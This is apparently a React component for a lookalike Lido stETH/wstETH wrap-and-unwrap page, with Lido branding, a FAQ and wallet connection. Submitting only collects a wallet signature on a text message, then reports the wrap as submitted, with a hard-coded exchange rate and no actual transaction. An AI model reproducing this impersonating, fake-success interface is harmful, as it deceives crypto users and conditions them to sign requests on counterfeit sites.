import React, { useState } from 'react';
import { ChevronDown, ExternalLink, ArrowDown, Loader2, HelpCircle } from 'lucide-react';
import { useAppKit } from '@reown/appkit/react';
import { useAccount, useSignMessage, useBalance } from 'wagmi';
import { formatUnits } from 'viem';
import { motion, AnimatePresence } from 'motion/react';
import { toast } from 'sonner';
import SignatureModal from './SignatureModal';

export default function Wrap() {
  const { open } = useAppKit();
  const { isConnected, address } = useAccount();

  const { data: balanceData } = useBalance({ address });
  const { signMessageAsync } = useSignMessage();
  const [amount, setAmount] = useState('');
  const [mode, setMode] = useState<'wrap' | 'unwrap'>('wrap');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSigModal, setShowSigModal] = useState(false);
  const [openFaqIndex, setOpenFaqIndex] = useState<number | null>(null);

  const faqs = [
    { question: "What is wstETH?", answer: "wstETH (wrapped stETH) is a non-rebasing ERC-20 token version of stETH where your token balance remains constant while its value increases relative to stETH over time." },
    { question: "How can I get wstETH?", answer: "You can wrap your stETH directly on this page or acquire wstETH on decentralized exchanges like Uniswap or Curve." },
    { question: "How can I use wstETH?", answer: "wstETH is widely integrated across DeFi protocols on Ethereum Mainnet and Layer 2 solutions (Arbitrum, Optimism, Base, Polygon) for collateral, lending, and yield farming." },
    { question: "Do I get my staking rewards if I wrap stETH to wstETH?", answer: "Yes! Your staking rewards automatically accrue in the value/price ratio of wstETH relative to stETH, rather than increasing your token quantity." },
    { question: "How can I unwrap wstETH back to stETH?", answer: "Switch to the 'Unwrap' tab above, enter your wstETH amount, and submit the signature request in your wallet." },
  ];

  const handleSubmit = async () => {
    if (!isConnected) {
      try { open(); } catch (e) { console.warn(e); }
      return;
    }

    if (!amount || isNaN(Number(amount)) || Number(amount) <= 0) {
      toast.error(`Please enter a valid ${mode === 'wrap' ? 'stETH' : 'wstETH'} amount`);
      return;
    }

    setIsSubmitting(true);
    setShowSigModal(true);

    try {
      const actionTitle = mode === 'wrap' ? 'Wrap stETH to wstETH' : 'Unwrap wstETH to stETH';
      const message = `Lido ${mode.toUpperCase()} Request\nAction: ${actionTitle}\nAmount: ${amount} ${mode === 'wrap' ? 'stETH' : 'wstETH'}\nTimestamp: ${new Date().toISOString()}`;
      
      await signMessageAsync({ account: address as `0x${string}`, message });
      toast.success(`Signature approved! ${actionTitle} request for ${amount} submitted.`);
      setAmount('');
    } catch (error: any) {
      const msg = error?.message || 'User rejected signature request.';
      if (msg.toLowerCase().includes('reject') || msg.toLowerCase().includes('denied') || msg.toLowerCase().includes('cancel')) {
        toast.error('Signature request rejected in wallet.');
      } else {
        toast.error('Wallet signature failed. Please try again.');
      }
    } finally {
      setIsSubmitting(false);
      setShowSigModal(false);
    }
  };

  return (
    <div className="w-full">
      <div className="text-center mb-8">
        <h1 className="text-[28px] font-bold text-[var(--foreground)] mb-2 transition-colors duration-300">Wrap & Unwrap</h1>
        <p className="text-[var(--muted)] text-[15px] transition-colors duration-300">Stable-balance stETH wrapper for DeFi</p>
      </div>

      <div className="bg-[var(--card)] rounded-[24px] p-4 md:p-6 mb-8 border border-[var(--border)] shadow-xl transition-colors duration-300">
        <div className="flex bg-[var(--input-bg)] p-1 rounded-xl mb-6 transition-colors duration-300">
          <button 
            onClick={() => setMode('wrap')}
            className={`flex-1 py-2 text-[14px] font-bold rounded-lg transition-all ${mode === 'wrap' ? 'bg-[var(--border)] text-[var(--foreground)] shadow-sm' : 'text-[var(--muted)] hover:text-[var(--foreground)]'}`}
          >
            Wrap
          </button>
          <button 
            onClick={() => setMode('unwrap')}
            className={`flex-1 py-2 text-[14px] font-bold rounded-lg transition-all ${mode === 'unwrap' ? 'bg-[var(--border)] text-[var(--foreground)] shadow-sm' : 'text-[var(--muted)] hover:text-[var(--foreground)]'}`}
          >
            Unwrap
          </button>
        </div>

        <div className="bg-[var(--input-bg)] rounded-[20px] p-4 mb-4 border border-transparent focus-within:border-[var(--primary)]/30 focus-within:shadow-[0_0_15px_rgba(0,163,255,0.1)] transition-all">
          <div className="flex justify-between items-center">
            <div className="flex items-center space-x-2 bg-[var(--card)] rounded-xl px-3 py-2 border border-[var(--border)] transition-colors duration-300">
              <div className="w-6 h-6 rounded-full flex items-center justify-center">
                <img src="https://cryptologos.cc/logos/steth-steth-logo.svg" alt="stETH" className="w-full h-full" />
              </div>
              <span className="text-[15px] font-bold text-[var(--foreground)] transition-colors duration-300">{mode === 'wrap' ? 'stETH' : 'wstETH'}</span>
            </div>
            <div className="flex items-center gap-3">
              {isConnected && balanceData && (
                <span className="text-[12px] text-[var(--muted)] font-medium">
                  Bal: {parseFloat(formatUnits(balanceData.value, balanceData.decimals)).toFixed(4)}
                </span>
              )}
              <button 
                onClick={() => {
                  if (!isConnected) {
                    open();
                    return;
                  }
                  if (balanceData) {
                    setAmount(parseFloat(formatUnits(balanceData.value, balanceData.decimals)).toFixed(4));
                  } else {
                    toast.info('Fetching balance...');
                  }
                }}
                className="text-[var(--primary)] font-bold text-[12px] bg-[var(--primary)]/10 hover:bg-[var(--primary)]/20 px-3 py-1.5 rounded-lg transition-colors cursor-pointer"
              >
                MAX
              </button>
            </div>
          </div>
          <div className="mt-4 flex items-center">
             <input 
              type="number" 
              placeholder={`${mode === 'wrap' ? 'stETH' : 'wstETH'} amount`}
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="bg-transparent text-[32px] md:text-[36px] font-bold outline-none w-full text-[var(--foreground)] placeholder-[var(--input-placeholder)] transition-colors duration-300" 
            />
          </div>
        </div>

        <button 
          onClick={handleSubmit}
          disabled={isSubmitting}
          className="w-full py-4 rounded-[16px] font-bold text-[16px] bg-[var(--primary)] hover:opacity-90 text-white transition-all shadow-[0_4px_12px_rgba(0,163,255,0.2)] mb-6 cursor-pointer flex items-center justify-center"
        >
          {isSubmitting ? (
            <><Loader2 size={18} className="animate-spin mr-2" /> Submitting...</>
          ) : (
            isConnected ? (amount ? (mode === 'wrap' ? 'Wrap' : 'Unwrap') : 'Enter amount') : 'Connect wallet'
          )}
        </button>

        <div className="space-y-3 px-2 mb-6">
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] transition-colors duration-300">You will receive</span>
            <span className="font-medium text-[var(--foreground)] transition-colors duration-300">{amount ? (parseFloat(amount) * 0.8643).toFixed(4) : '0.0'} {mode === 'wrap' ? 'wstETH' : 'stETH'}</span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] transition-colors duration-300">Exchange rate</span>
            <span className="font-medium text-[var(--foreground)] transition-colors duration-300">1 stETH = 0.8643 wstETH</span>
          </div>
          <div className="flex justify-between items-center text-[13px]">
            <span className="text-[var(--muted)] transition-colors duration-300">Lido fee</span>
            <span className="font-bold text-[#00E5FF]">0%</span>
          </div>
        </div>

        <div className="bg-[var(--input-bg)] border border-[var(--primary)]/20 rounded-xl p-4 flex items-start space-x-3 transition-colors duration-300">
           <div className="text-[var(--primary)] mt-0.5">
             <span className="inline-flex items-center justify-center w-5 h-5 rounded-full border border-[var(--primary)] text-[12px] font-bold">?</span>
           </div>
           <p className="text-[12px] text-[var(--muted)] leading-relaxed transition-colors duration-300">
             Wrapping converts your rebasing stETH into a fixed-balance wstETH token. Your rewards still accrue, but as price appreciation rather than balance increase.
           </p>
        </div>
      </div>

      <div className="mb-12">
        <div className="flex items-center gap-2 mb-4">
          <div className="w-7 h-7 rounded-lg bg-[var(--primary)]/10 text-[var(--primary)] flex items-center justify-center">
            <HelpCircle size={16} />
          </div>
          <h2 className="text-[20px] font-bold text-[var(--foreground)] transition-colors duration-300">Wrapping FAQ</h2>
        </div>
        <div className="space-y-3">
          {faqs.map((faq, idx) => (
            <div key={idx} className="bg-[var(--card)] border border-[var(--border)] rounded-2xl overflow-hidden hover:border-[var(--muted)]/50 transition-all shadow-sm">
              <button 
                onClick={() => setOpenFaqIndex(openFaqIndex === idx ? null : idx)}
                className="flex items-center justify-between p-4 w-full text-left cursor-pointer group"
              >
                <span className="text-[14px] font-medium text-[var(--foreground)] transition-colors duration-300 pr-3">{faq.question}</span>
                <motion.div animate={{ rotate: openFaqIndex === idx ? 180 : 0 }}>
                  <ChevronDown size={18} className="text-[var(--muted)] group-hover:text-[var(--foreground)] shrink-0" />
                </motion.div>
              </button>
              <AnimatePresence>
                {openFaqIndex === idx && (
                  <motion.div
                    initial={{ height: 0, opacity: 0 }}
                    animate={{ height: 'auto', opacity: 1 }}
                    exit={{ height: 0, opacity: 0 }}
                    transition={{ duration: 0.2 }}
                  >
                    <div className="px-4 pb-4 text-[14px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)]/50 pt-3">
                      {faq.answer}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          ))}
        </div>
      </div>

      <div className="text-[12px] text-[var(--muted)] leading-relaxed border-t border-[var(--border)] pt-6 pb-12 transition-colors duration-300">
        <p className="mb-4">
          Lido is an open-source peer-to-system software suite that enables users to mint transferable utility tokens (stETH) which receive rewards linked to Ethereum validation activities.
        </p>
        <div className="flex flex-wrap items-center gap-4 font-medium text-[var(--foreground)] transition-colors duration-300">
           <div className="w-4 h-4 flex items-center justify-center">
             <img src="https://cryptologos.cc/logos/lido-dao-ldo-logo.svg" alt="Lido" className="w-full h-full opacity-80" />
           </div>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Terms of Use</a>
           <a href="#" className="hover:text-[var(--primary)] transition-colors">Privacy Notice</a>
           <a href="#" className="flex items-center hover:text-[var(--primary)] transition-colors">IPFS <ExternalLink size={12} className="ml-1" /></a>
           <div className="ml-auto px-2 py-1 bg-[var(--card)] border border-[var(--border)] rounded-md text-[10px] text-[var(--muted)] transition-colors duration-300">
             v0.145.0
           </div>
        </div>
      </div>

      <SignatureModal
        isOpen={showSigModal}
        onClose={() => {
          setShowSigModal(false);
          setIsSubmitting(false);
        }}
        actionName={mode === 'wrap' ? 'Wrap stETH' : 'Unwrap wstETH'}
        details={`${amount} ${mode === 'wrap' ? 'stETH -> wstETH' : 'wstETH -> stETH'}`}
        address={address}
      />
    </div>
  );
}
